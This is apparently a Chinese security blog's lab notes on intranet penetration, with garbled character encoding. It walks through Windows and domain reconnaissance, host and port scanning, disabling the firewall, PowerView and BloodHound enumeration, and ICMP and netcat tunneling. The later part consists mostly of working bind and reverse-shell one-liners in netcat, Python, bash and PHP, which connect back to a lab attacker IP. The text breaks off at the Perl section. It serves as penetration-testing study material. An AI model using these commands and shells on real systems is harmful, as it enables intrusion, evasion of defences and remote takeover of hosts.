<h4 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h4><p><code>systeminfo</code> </p>
<p><code>systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot;</code> è·å–æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</p>
<p><img src="/posts/11ff0b53/systeminfo.png"></p>
<p><code>wmic product get name.version</code> æŸ¥çœ‹æœ¬æœºå®‰è£…çš„è½¯ä»¶å’Œç‰ˆæœ¬ä¿¡æ¯</p>
<p><img src="/posts/11ff0b53/wmic_product.png"></p>
<p><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code>  æŸ¥çœ‹æœ¬æœºå®‰è£…çš„è½¯ä»¶å’Œç‰ˆæœ¬ä¿¡æ¯</p>
<p><code>netstat -ano</code> æŸ¥çœ‹ç«¯å£åˆ—è¡¨</p>
<p><code>systeminfo </code>æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯</p>
<p><code>wmic qfe get description,installedOn /format:csv</code> æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</p>
<p><code>net share</code> æŸ¥è¯¢æœ¬æœºå…±äº«</p>
<h4 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h4><p><code>netsh advfirewall show allprofiles</code> æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</p>
<p><code>netsh firewall show logging</code> é˜²ç«å¢™æ—¥å¿—ç›®å½•</p>
<p><code>netsh advfirewall set allprofiles state off</code>  å…³é—­é˜²ç«å¢™ï¼ˆwinServer 2003ä»¥åï¼‰</p>
<hr>
<h3 id="åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…ä¿¡æ¯æ”¶é›†</h3><h4 id="åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ"></a>åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ</h4><p><code>ipconfig /all</code>æŸ¥çœ‹ä¿¡æ¯</p>
<p><code>net time /domain</code> åˆ¤æ–­æ˜¯å¦å­˜åœ¨  </p>
<blockquote>
<p>å­˜åœ¨   è¿”å›åŸŸä¿¡æ¯å’Œæ—¶é—´ </p>
<p>å­˜åœ¨ä½†æƒé™ä¸è¶³  å‘ç”Ÿç³»ç»Ÿé”™è¯¯ æ‹’ç»è®¿é—®</p>
<p>ä¸å­˜åœ¨ æ‰¾ä¸åˆ°åŸŸWorkgroupçš„åŸŸæ§åˆ¶å™¨</p>
</blockquote>
<br>

<h4 id="åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹"></a>åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹</h4><h5 id="åŸºäºICMP"><a href="#åŸºäºICMP" class="headerlink" title="åŸºäºICMP"></a>åŸºäºICMP</h5><ul>
<li>windows</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /l %i in (1,1,254) do @ping 192.168.56.%i -w 1 -n 1 | find /i &quot;ttl=&quot;</span><br><span class="line"></span><br><span class="line">è§£é‡Š:</span><br><span class="line">%i in (1,1,254)    éå†ä¸»æœºä½ä»1 ~254çš„æ‰€æœ‰IP </span><br><span class="line">-n    pingçš„æ¬¡æ•°           </span><br><span class="line">-w    ç­‰å¾…æ¯æ¬¡å›å¤çš„æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰            </span><br><span class="line">192.168.0.%i    éå†IP è‡ª192.168.0.1~192.168.0.254çš„æ‰€æœ‰IP           </span><br><span class="line">| bat    ç®¡é“ï¼Œå°†å‰é¢çš„ç»“æœé€šè¿‡ç®¡é“è¾“å…¥ç»™åé¢çš„å‘½ä»¤  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/icmp_ping.png"></p>
<ul>
<li>Linux</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nmapæ‰«æ</li>
</ul>
<p><code>nmap â€sP â€PI 192.168.0.1/24 â€T4</code></p>
<p><img src="/posts/11ff0b53/nmap_icmp.png"></p>
<br>

<h5 id="åŸºäºarp"><a href="#åŸºäºarp" class="headerlink" title="åŸºäºarp"></a>åŸºäºarp</h5><ul>
<li>arp-scan   ä¸‹è½½åœ°å€: <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></li>
</ul>
<p>ç”¨æ³• <code>arp-scan.exe -t 192.168.56.0/24</code></p>
<p><img src="/posts/11ff0b53/arp-scan.png"></p>
<ul>
<li>arp</li>
</ul>
<p><code>arp -a</code></p>
<ul>
<li>nmapæ‰«æ</li>
</ul>
<p><code>nmap -sn -PR 192.168.0.1/24</code></p>
<p><img src="/posts/11ff0b53/nmap_arp.png"></p>
<ul>
<li>msfæ‰«æ</li>
</ul>
<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
<br>

<h5 id="åŸºäºudp"><a href="#åŸºäºudp" class="headerlink" title="åŸºäºudp"></a>åŸºäºudp</h5><ul>
<li>scanline</li>
</ul>
<p><code>scanline.exe 192.168.56.101</code></p>
<p><img src="/posts/11ff0b53/scanline.png"></p>
<br>

<h5 id="åŸºäºNetBIOS"><a href="#åŸºäºNetBIOS" class="headerlink" title="åŸºäºNetBIOS"></a>åŸºäºNetBIOS</h5><ul>
<li>nbtscan</li>
</ul>
<p><code>nbtscan -r 192.168.0.0/24</code></p>
<p><img src="/posts/11ff0b53/nbtscan.png"></p>
<ul>
<li>msfæ‰«æ</li>
</ul>
<p><code>use auxiliary/scanner/netbios/nbname</code><br><img src="/posts/11ff0b53/msf_netbios.png"></p>
<ul>
<li>nmapæ‰«æ</li>
</ul>
<p><code>nmap -sU --script nbstat.nse -p137 192.168.0.1/24 -T4</code></p>
<p><img src="/posts/11ff0b53/nmap_netbios.png"></p>
<br>

<h4 id="æ‰«æåŸŸå†…ç«¯å£"><a href="#æ‰«æåŸŸå†…ç«¯å£" class="headerlink" title="æ‰«æåŸŸå†…ç«¯å£"></a>æ‰«æåŸŸå†…ç«¯å£</h4><h5 id="åˆ©ç”¨telnet-å‘½ä»¤è¿›è¡Œæ‰«æ"><a href="#åˆ©ç”¨telnet-å‘½ä»¤è¿›è¡Œæ‰«æ" class="headerlink" title="åˆ©ç”¨telnet å‘½ä»¤è¿›è¡Œæ‰«æ"></a>åˆ©ç”¨telnet å‘½ä»¤è¿›è¡Œæ‰«æ</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet ç›®æ ‡ipåœ°å€ ç«¯å£å·</span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£"><a href="#åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£" class="headerlink" title="åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£"></a>åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£</h5><p><code>use auxiliary/scanner/portscan/tcp</code></p>
<p><code>show options </code></p>
<p><code>set ports 1-1024 </code></p>
<p><code>set RHOSTS 192.168.56.101</code></p>
<p><code>set THREADS 10 </code></p>
<p><code>run</code></p>
<p><img src="/posts/11ff0b53/msf_portscan_tcp.png"></p>
<h4 id="åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†</h4><p><code>net view /domain</code> æŸ¥çœ‹åŸŸ</p>
<p><code>net view /domain:åŸŸå</code> æŸ¥çœ‹åŸŸçš„ç”µè„‘</p>
<p><code>net group /domain</code> æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ç»„çš„åˆ—è¡¨</p>
<p><code>net group &quot;domain computers&quot; /domain </code>  æŸ¥è¯¢åŸŸæˆå‘˜çš„åˆ—è¡¨</p>
<p><code>net account /domain</code></p>
<h4 id="æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜"><a href="#æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜" class="headerlink" title="æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜"></a>æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜</h4><p><code>net user /domain</code></p>
<h4 id="å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·"><a href="#å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·" class="headerlink" title="å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·"></a>å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·</h4><p>å‚è€ƒ <a href="https://www.secpulse.com/archives/32859.html">https://www.secpulse.com/archives/32859.html</a></p>
<p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p>
<ul>
<li><p>Empire  user_hunteræ¨¡å—</p>
</li>
<li><p>psloggedon.exe</p>
</li>
</ul>
<p><code>PsLoggedon.exe</code></p>
<ul>
<li>PVEFindADUser.exe</li>
</ul>
<p><code>PVEFindADUser.exe --current</code> æšä¸¾å‡ºåŸŸç”¨æˆ·ä»¥åŠç™»é™†è¿‡ç‰¹å®šç³»ç»Ÿçš„ç”¨æˆ·(éœ€è¦ç®¡ç†å‘˜æƒé™)</p>
<ul>
<li>Netsess.exe </li>
</ul>
<p>æŸ¥è¯¢æ‰€æœ‰åŸŸæ§åˆ¶å™¨ï¼Œè·å–æ‰€æœ‰çš„æ´»è·ƒåŸŸ </p>
<p>ä¸‹è½½åœ°å€:<a href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
<p>ç”¨æ³• <code>Netsess.exe -h</code></p>
<br>

<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>ç‰ˆæœ¬</p>
<blockquote>
<p>2.0     win2008,win7</p>
<p>3.0    win2018,win8</p>
<p>4.0    win2012R2,win8.1</p>
<p>5.0    win2016,win10</p>
</blockquote>
<p>å­˜åœ¨4ä¸­æƒé™</p>
<blockquote>
<p>Restricted     ä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬</p>
<p>Allsigned        åªå…è®¸æ‰§è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬</p>
<p>Unrestricted    å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬</p>
<p>RemoteSigned    æœ¬åœ°è„šæœ¬ä¸é™åˆ¶ï¼Œå¯¹å¤–éƒ¨è„šæœ¬éœ€è¦ç»è¿‡è¯ä¹¦éªŒè¯</p>
</blockquote>
<p><code>Get-ExecutionPolicy</code>     æŸ¥çœ‹PSæƒé™</p>
<p><code>Set-ExecutionPolicy +æƒé™</code></p>
<p>ä¸€èˆ¬ä¼šç”¨cmd å‘½ä»¤è¡Œ  ä½¿ç”¨<code>-exec bypass</code>è¿›è¡Œpowershellç»•è¿‡</p>
<h5 id="PowerViewè„šæœ¬"><a href="#PowerViewè„šæœ¬" class="headerlink" title="PowerViewè„šæœ¬"></a>PowerViewè„šæœ¬</h5><p>è„šæœ¬åœ°å€ï¼š<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p><code>Import-Module</code>ä¸ºpowershellå¯¼å…¥è„šæœ¬å‘½ä»¤ï¼Œè¿™é‡Œå‡è®¾æˆ‘ä»¬ä¸‹è½½çš„powerview.ps1è„šæœ¬åœ¨C:\PowerView.ps1</p>
<p>æ ¼å¼ï¼š</p>
<p><code>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerviewçš„å‘½ä»¤å‚æ•°&#125;&quot;</code></p>
<p>powershell.exe -exec bypass -Command â€œ&amp; {Import-Module C:\PowerView.ps1; Get-NetUser}â€</p>
<p>PowerViewå‘½ä»¤å‚æ•°</p>
<blockquote>
<p>Get-NetDomain: è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°<br>Get-NetUser: è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯<br>Get-NetDomainController: è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯<br>Get-NetComputer: è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯<br>Get-NetOU: è·å–åŸŸä¸­çš„OUä¿¡æ¯<br>Get-NetGroup: è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜ä¿¡æ¯<br>Get-NetFileServer: æ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯<br>Get-NetShare: è·å–å½“å‰åŸŸå†…æ‰€æœ‰ç½‘ç»œå…±äº«ä¿¡æ¯<br>Get-NetSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯<br>Get-NetRDPSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥<br>Get-NetProcess: è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹<br>Get-UserEvent: è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—<br>Get-ADObiect: è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡<br>Get-NetGPO: è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡<br>Get-DomainPolicy: è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥<br>Invoke-UserHunter: è·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™<br>Invoke-ProcessHunter: é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·<br>Invoke-UserEvenHunter: æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ã€‚</p>
</blockquote>
<br>

<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHoundéœ€è¦ä½¿ç”¨neo4jæ•°æ®åº“ï¼Œé…å¤‡javaç¯å¢ƒ</p>
<p>ä¸‹è½½åœ°å€ <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
<blockquote>
<p>URLï¼šneo4j://localhost:7687<br>ç”¨æˆ·å(é»˜è®¤)ï¼šneo4j<br>å¯†ç (é»˜è®¤)ï¼šneo4j</p>
</blockquote>
<p>ä½¿ç”¨ã€å¾…è¡¥å…… ã€‘Â·</p>
<hr>
<h3 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h3><p>éš§é“: ç»•è¿‡é˜²ç«å¢™å±è”½çš„ä¸€ç§æ–¹å¼</p>
<br>

<p>ç½‘ç»œå±‚éš§é“ï¼š</p>
<ul>
<li>IPv6</li>
<li>ICMP</li>
</ul>
<p>ä¼ è¾“å±‚</p>
<ul>
<li>TCP</li>
<li>UDP</li>
</ul>
<p>åº”ç”¨å±‚</p>
<ul>
<li>SSH</li>
<li>HTTP</li>
<li>DNS</li>
</ul>
<br>

<h4 id="å†…ç½‘è¿é€šæ€§åˆ¤æ–­"><a href="#å†…ç½‘è¿é€šæ€§åˆ¤æ–­" class="headerlink" title="å†…ç½‘è¿é€šæ€§åˆ¤æ–­"></a>å†…ç½‘è¿é€šæ€§åˆ¤æ–­</h4><ul>
<li><p>ICMPåè®®</p>
<p>  ping ip</p>
</li>
<li><p>TCPåè®®</p>
<p>  nc  -zc ip port</p>
</li>
<li><p>HTTPåè®®</p>
<p>  curl ip:port</p>
</li>
<li><p>DNSåè®®</p>
<p>  nslookup  <a href="http://www.baidu.com/">www.baidu.com</a> </p>
<p>  dig @8.8.8.8 <a href="http://www.baidu.com/">www.baidu.com</a></p>
</li>
</ul>
<br>

<br>

<h4 id="ç½‘ç»œå±‚éš§é“"><a href="#ç½‘ç»œå±‚éš§é“" class="headerlink" title="ç½‘ç»œå±‚éš§é“"></a>ç½‘ç»œå±‚éš§é“</h4><ul>
<li>Ipv6éš§é“</li>
<li>ICMPéš§é“</li>
</ul>
<br>

<h5 id="ICMPéš§é“"><a href="#ICMPéš§é“" class="headerlink" title="ICMPéš§é“"></a>ICMPéš§é“</h5><p>ICMPéš§é“å·¥å…·ï¼šicmpshï¼ŒPingtunnel</p>
<p>icmpsh (ä»…é€‚ç”¨äºwindowsï¼Œæ‰§è¡Œicmpsh.exeä¸éœ€è¦ç®¡ç†å‘˜æƒé™)</p>
<p>Pingtunnel</p>
<br>

<h5 id="icmpshåå¼¹shell"><a href="#icmpshåå¼¹shell" class="headerlink" title="icmpshåå¼¹shell"></a>icmpshåå¼¹shell</h5><p>å‚è€ƒ:<a href="https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ">https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ</a></p>
<p>å®‰è£… <code>git clone https://github.com/inquisb/icmpsh.git</code></p>
<p>å®‰è£…ä¾èµ–åº“<code>sudo  pip2 install impacket</code></p>
<blockquote>
<p>ç¯å¢ƒ</p>
<p>kali 192.168.0.128<br>win7 192.168.0.129</p>
</blockquote>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> å…³é—­æœ¬åœ°ç³»ç»Ÿçš„icmpåº”ç­”ï¼Œæ¢å¤æ”¹ä¸º0å³å¯</p>
<p>å°† icmpsh.exeä¼ åˆ°win7ä¸­ï¼Œè¿™é‡Œå¼€å¯ä¸ªhttpæœåŠ¡å»ä¸‹è½½<code>python3 -m http.server 9999</code></p>
<p>win7è®¿é—®192.168.0.128:9999 å»ä¸‹è½½ icmpsh.exe</p>
<p>icmpsh.exeå‚æ•°</p>
<blockquote>
<p>-t host         :æŒ‡å®šæ”»å‡»è€…IP<br>-r              :ç”¨äºæµ‹è¯•è¿æ¥<br>-d milliseconds :è®¾ç½®è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿ(æ¯«ç§’)<br>-o milliseconds :è®¾ç½®å“åº”è¶…æ—¶æ—¶é—´(æ¯«ç§’),è¶…æ—¶ä¸€æ¬¡åˆ™è®¡æ•°å™¨+1<br>-b num          :è®¾ç½®å¤šå°‘æ¬¡é€€å‡º<br>-s bytes        :æœ€å¤§æ•°æ®ç¼“å†²åŒºå¤§å°(å­—èŠ‚)</p>
</blockquote>
<p>kali:<code>sudo python2 icmpsh_m.py  192.168.0.128[kali] 192.168.0.129[win7]</code></p>
<p>win7 <code>icmpsh.exe -t 192.168.0.128</code></p>
<p>æˆåŠŸåå¼¹shell</p>
<p><img src="/posts/11ff0b53/icmpsh_shell.png"></p>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0</code>æ¢å¤åŸè®¾ç½®</p>
<br>

<h5 id="PingTunnelä½¿ç”¨"><a href="#PingTunnelä½¿ç”¨" class="headerlink" title="PingTunnelä½¿ç”¨"></a>PingTunnelä½¿ç”¨</h5><p>ã€å¾…è¡¥å……ã€‘</p>
<hr>
<h4 id="ä¼ è¾“å±‚éš§é“"><a href="#ä¼ è¾“å±‚éš§é“" class="headerlink" title="ä¼ è¾“å±‚éš§é“"></a>ä¼ è¾“å±‚éš§é“</h4><h5 id="lcxç«¯å£è½¬å‘"><a href="#lcxç«¯å£è½¬å‘" class="headerlink" title="lcxç«¯å£è½¬å‘"></a>lcxç«¯å£è½¬å‘</h5><p>ã€å¾…è¡¥å……ã€‘</p>
<h5 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h5><p>ä¸‹è½½åœ°å€ï¼ˆè§£å‹å¯†ç ä¸ºncï¼‰:</p>
<p><a href="https://joncraton.org/files/nc111nt.zip">https://joncraton.org/files/nc111nt.zip</a></p>
<p><a href="https://joncraton.org/files/nc111nt_safe.zip">https://joncraton.org/files/nc111nt_safe.zip</a></p>
<br>

<h6 id="è·å–bannerä¿¡æ¯"><a href="#è·å–bannerä¿¡æ¯" class="headerlink" title="è·å–bannerä¿¡æ¯"></a>è·å–bannerä¿¡æ¯</h6><p><code>nc -nv 192.168.0.130 22</code></p>
<p><img src="/posts/11ff0b53/nc_nv.png"></p>
<h6 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h6><p><code>nc -zv 192.168.56.101 1080</code></p>
<p><img src="/posts/11ff0b53/nc_portscan.png">              </p>
<h6 id="è¿œç¨‹è¿æ¥ä¸»æœº"><a href="#è¿œç¨‹è¿æ¥ä¸»æœº" class="headerlink" title="è¿œç¨‹è¿æ¥ä¸»æœº"></a>è¿œç¨‹è¿æ¥ä¸»æœº</h6><p><code>nc -nvv 192.168.0.129 80</code>                                                     </p>
<h6 id="ç›‘å¬ç«¯å£"><a href="#ç›‘å¬ç«¯å£" class="headerlink" title="ç›‘å¬ç«¯å£"></a>ç›‘å¬ç«¯å£</h6><p><code>nc -lp 9999</code> ç›‘å¬æœ¬åœ°9999ç«¯å£ï¼Œè®¿é—®è¯¥ç«¯å£æ˜¯ä¼šè¾“å‡ºä¿¡æ¯</p>
<h6 id="æ–‡ä»¶ä¼ è¾“"><a href="#æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ–‡ä»¶ä¼ è¾“"></a>æ–‡ä»¶ä¼ è¾“</h6><p>Ubuntu: <code>nc -lp 6666 &gt; test.txt</code> å¼€å¯ç›‘å¬</p>
<p>kaliï¼š<code>echo &#39;test&#39; &gt; test.txt</code></p>
<p><code>nc -vn 192.168.0.130 6666 &lt; test.txt -q 1</code></p>
<p><img src="/posts/11ff0b53/nc_file.png"></p>
<h6 id="ç®€æ˜“èŠå¤©"><a href="#ç®€æ˜“èŠå¤©" class="headerlink" title="ç®€æ˜“èŠå¤©"></a>ç®€æ˜“èŠå¤©</h6><p>Ubuntu: <code>nc -l -p 8888</code></p>
<p>kaliï¼š<code>nc -vn 192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_talk.png"></p>
<h5 id="ncè·å–shell"><a href="#ncè·å–shell" class="headerlink" title="ncè·å–shell"></a>ncè·å–shell</h5><p>å‚è€ƒ <a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://www.jianshu.com/p/91dd4ab317c7">https://www.jianshu.com/p/91dd4ab317c7</a></p>
<br>

<blockquote>
<p>æ­£å‘shell   ç›®æ ‡æœºè¿›è¡Œç›‘å¬<br>åå‘shell   æ”»å‡»æœºè¿›è¡Œç›‘å¬</p>
</blockquote>
<h6 id="æ­£å‘shell"><a href="#æ­£å‘shell" class="headerlink" title="æ­£å‘shell"></a>æ­£å‘shell</h6><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è·å–æœåŠ¡ç«¯çš„shell ï¼ˆkaliã€æ”»å‡»æœºã€‘è¿æ¥ï¼Œç›®æ ‡æœºç›‘å¬ï¼‰</p>
<p>ç›®æ ‡æœºï¼š <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>æ”»å‡»æœºï¼š<code>nc 192.168.0.128 8888</code></p>
<br>

<p><img src="/posts/11ff0b53/nc_ubuntu_error.png"></p>
<p>è¿™é‡Œæˆ‘ä½¿ç”¨Ubuntuä½œä¸ºç›®æ ‡æœºå™¨æ˜¯ ä½¿ç”¨-e å‚æ•°ä¼šæŠ¥é”™ï¼Œä½¿ç”¨ç‰ˆæœ¬ä¸åŒï¼Œè¿™é‡Œubuntué»˜è®¤ç‰ˆæœ¬çš„ncä¸ºnetcat-openbsd ï¼Œæ²¡æœ‰-eå‚æ•° è€Œnetcat-traditionalç‰ˆæœ¬[v1.10-41.1] çš„å­˜åœ¨-eé€‰é¡¹ï¼Œkaliä¹Ÿæ˜¯é»˜è®¤è¯¥ç‰ˆæœ¬çš„nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ç»™Ubuntuæ›¿æ¢ä¸€ä¸ªncç‰ˆæœ¬ å‚è€ƒhttps://www.jianshu.com/p/91dd4ab317c7</span><br><span class="line">sudo apt-get -y install netcat-traditional </span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config nc </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/ubuntu_nc_tra.png"></p>
<p>æˆåŠŸåˆ‡æ¢ubuntuçš„ncç‰ˆæœ¬</p>
<br>

<p>ä¾æ—§ä½¿ç”¨kaliä½œä¸ºæ”»å‡»æœºï¼Œubuntuä½œä¸ºç›®æ ‡æœº</p>
<p>ubuntu: <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>kali: <code>nc  192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_shell1.png"></p>
<h6 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘shell</h6><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è·å–å®¢æˆ·ç«¯çš„shellï¼ˆkaliã€æ”»å‡»æœºã€‘ç›‘å¬ï¼Œç›®æ ‡æœºè¿æ¥ï¼‰</p>
<p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœº ï¼š<code>nc 192.168.0.130 8888 -e /bin/sh</code></p>
<p>å¦‚æœæ˜¯windows <code>nc -lvp lport -e c:\windows\system32\cmd.exe </code></p>
<p><img src="/posts/11ff0b53/nc_shell2.png"></p>
<h6 id="pythonåå‘shell"><a href="#pythonåå‘shell" class="headerlink" title="pythonåå‘shell"></a>pythonåå‘shell</h6><p>æ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨çš„python2è¿›è¡Œåå¼¹shell</p>
<p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>python2 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.128&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
<p><img src="/posts/11ff0b53/nc_shell3.png"></p>
<h6 id="bashåå‘shell"><a href="#bashåå‘shell" class="headerlink" title="bashåå‘shell"></a>bashåå‘shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888 </code></p>
<p>ç›®æ ‡æœºï¼š<code>bash -i &gt;&amp; /dev/tcp/192.168.0.128/8888 0&gt;&amp;1</code></p>
<p><img src="/posts/11ff0b53/nc_shell4.png"></p>
<h6 id="phpåå‘shell"><a href="#phpåå‘shell" class="headerlink" title="phpåå‘shell"></a>phpåå‘shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>php -r &#39;$sock=fsockopen(&quot;192.168.0.128&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
<p>ç”±äºubuntuæ²¡è£…phpç¯å¢ƒå°±ä¸æˆªå›¾æ¼”ç¤ºäº†</p>
<h6 id="perlåå‘shell"><a href="#perlåå‘shell" class="headerlink" title="perlåå‘shell"></a>perlåå‘shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
